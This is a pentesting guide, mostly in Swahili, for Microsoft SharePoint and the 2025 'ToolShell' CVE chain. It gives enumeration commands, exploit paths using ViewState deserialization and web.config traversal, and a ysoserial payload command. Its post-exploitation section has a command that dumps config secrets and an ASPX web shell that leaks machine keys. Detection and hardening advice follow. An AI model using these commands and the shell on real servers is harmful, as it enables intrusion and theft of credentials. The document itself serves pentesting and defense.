# Microsoft SharePoint – Pentesting & Exploitation

{{#include ../../banners/hacktricks-training.md}}

> Microsoft SharePoint (on-premises) imejengwa juu ya ASP.NET/IIS. Hivyo, sehemu nyingi za shambulio la wavuti za jadi (ViewState, Web.Config, web shells, nk.) zipo, lakini SharePoint pia inakuja na mamia ya kurasa za ASPX za miliki na huduma za wavuti ambazo zinaongeza kwa kiasi kikubwa uso wa shambulio ulio wazi. Ukurasa huu unakusanya mbinu za vitendo za kuhesabu, kutumia na kudumisha ndani ya mazingira ya SharePoint huku ukisisitiza mnyororo wa shambulio wa 2025 uliofunuliwa na Unit42 (CVE-2025-49704/49706/53770/53771).

## 1. Quick enumeration
```
# favicon hash and keywords
curl -s https://<host>/_layouts/15/images/SharePointHome.png
curl -s https://<host>/_vti_bin/client.svc | file -  # returns WCF/XSI

# version leakage (often in JS)
curl -s https://<host>/_layouts/15/init.js | grep -i "spPageContextInfo"

# interesting standard paths
/_layouts/15/ToolPane.aspx               # vulnerable page used in 2025 exploit chain
/_vti_bin/Lists.asmx                     # legacy SOAP service
/_catalogs/masterpage/Forms/AllItems.aspx

# enumerate sites & site-collections (requires at least Anonymous)
python3 Office365-ADFSBrute/SharePointURLBrute.py -u https://<host>
```
## 2. 2025 exploit chain (a.k.a. “ToolShell”)

### 2.1 CVE-2025-49704 – Code Injection on ToolPane.aspx

`/_layouts/15/ToolPane.aspx?PageView=…&DefaultWebPartId=<payload>` inaruhusu *Server-Side Include* code kuingizwa kwenye ukurasa ambao baadaye unakusanywa na ASP.NET. Mshambuliaji anaweza kuingiza C# inayotekeleza `Process.Start()` na kuacha ViewState mbaya.

### 2.2 CVE-2025-49706 – Improper Authentication Bypass

Ukurasa huo huo unategemea kichwa cha **X-Forms_BaseUrl** ili kubaini muktadha wa tovuti. Kwa kuelekeza kwenye `/_layouts/15/`, MFA/SSO inayotekelezwa kwenye tovuti ya mzizi inaweza kupuuziliwa mbali **bila uthibitisho**.

### 2.3 CVE-2025-53770 – Unauthenticated ViewState Deserialization → RCE

Mara mshambuliaji anapodhibiti kifaa katika `ToolPane.aspx` wanaweza kutuma thamani ya **unsigned** (au MAC-tu) `__VIEWSTATE` inayosababisha deserialization ya .NET ndani ya *w3wp.exe* inayopelekea utekelezaji wa code.

Ikiwa kusainiwa kumewashwa, ny steal **ValidationKey/DecryptionKey** kutoka kwa `web.config` yoyote (ona 2.4) na uunda payload kwa *ysoserial.net* au *ysodom*:
```
ysoserial.exe -g TypeConfuseDelegate -f Json.Net -o raw -c "cmd /c whoami" |
ViewStateGenerator.exe --validation-key <hex> --decryption-key <hex> -o payload.txt
```
Kwa maelezo ya kina juu ya kutumia ASP.NET ViewState soma:
{{#ref}}
../../pentesting-web/deserialization/exploiting-__viewstate-parameter.md
{{#endref}}

### 2.4 CVE-2025-53771 – Path Traversal / web.config Disclosure

Kutuma parameter ya `Source` iliyoundwa kwa `ToolPane.aspx` (kwa mfano `../../../../web.config`) inarudisha faili lililokusudiwa, ikiruhusu kuvuja kwa:

* `<machineKey validationKey="…" decryptionKey="…">`  ➜ fanya ViewState / ASPXAUTH cookies
* nyuzi za muunganisho & siri.

## 3. Mapishi ya baada ya unyakuzi yaliyoshuhudiwa katika pori

### 3.1 Exfiltrate kila *.config* faili (toleo-1)
```
cmd.exe /c for /R C:\inetpub\wwwroot %i in (*.config) do @type "%i" >> "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\debug_dev.js"
```
`debug_dev.js` inayoweza kupakuliwa kwa siri na ina **yote** mipangilio nyeti.

### 3.2 Weka shell ya wavuti ya ASPX iliyoandikwa kwa Base64 (tofauti-2)
```
powershell.exe -EncodedCommand <base64>
```
Mfano wa payload iliyotafsiriwa (imepunguzika):
```csharp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
Response.Write(MachineKey.ValidationKey);
// echo secrets or invoke cmd
}
</script>
```
Imeandikwa kwa:
```
C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx
```
The shell inafichua mwisho wa **kusoma / kubadilisha funguo za mashine** ambazo zinaruhusu kutengeneza ViewState na vidakuzi vya ASPXAUTH katika shamba.

### 3.3 Tofauti iliyofichwa (variation-3)

Shell hiyo hiyo lakini:
* imetolewa chini ya `...\15\TEMPLATE\LAYOUTS\`
* majina ya mabadiliko yamepunguzwa kuwa herufi moja
* `Thread.Sleep(<ms>)` imeongezwa kwa ajili ya kuepuka sandbox & kupita AV kulingana na wakati.

## 4. Mawazo ya kugundua

| Telemetry | Kwa nini ni ya kushuku |
|-----------|----------------------|
| `w3wp.exe → cmd.exe`             | Mchakato wa mfanyakazi unapaswa nadra kuzalisha shell  |
| `cmd.exe → powershell.exe -EncodedCommand` | Mwelekeo wa jadi wa lolbin           |
| Matukio ya faili yanayounda `debug_dev.js` au `spinstall0.aspx` | IOCs moja kwa moja kutoka ToolShell |
| `ProcessCmdLine INASHIRIKI ToolPane.aspx` (ETW/Module logs) | PoCs za umma zinaita ukurasa huu |

Mfano wa sheria ya XDR / Sysmon (pseudo-XQL):
```
proc where parent_process_name="w3wp.exe" and process_name in ("cmd.exe","powershell.exe")
```
## 5. Kuimarisha & Kupunguza

1. **Patch** – Sasisho za usalama za Julai 2025 zinarekebisha *zote* CVEs nne.
2. **Rotate** kila `<machineKey>` na siri za `ViewState` baada ya kuathiriwa.
3. Ondoa ruhusa ya kuandika *LAYOUTS* kutoka kwa vikundi vya `WSS_WPG` & `WSS_ADMIN_WPG`.
4. Zuia ufikiaji wa nje kwa `/_layouts/15/ToolPane.aspx` katika kiwango cha proxy/WAF.
5. Wezesha **ViewStateUserKey**, **MAC enabled**, na *EventValidation* maalum.

## Njia zinazohusiana

* IIS post-exploitation & matumizi mabaya ya web.config:
{{#ref}}
../../network-services-pentesting/pentesting-web/iis-internet-information-services.md
{{#endref}}

## Marejeleo

- [Unit42 – Ukatili wa Kazi wa Uhalifu wa Microsoft SharePoint](https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/)
- [GitHub PoC – Mnyororo wa uhalifu wa ToolShell](https://github.com/real-or-not/ToolShell)
- [Microsoft Security Advisory – CVE-2025-49704 / 49706](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-49704)
- [Microsoft Security Advisory – CVE-2025-53770 / 53771](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-53770)

{{#include ../../banners/hacktricks-training.md}}
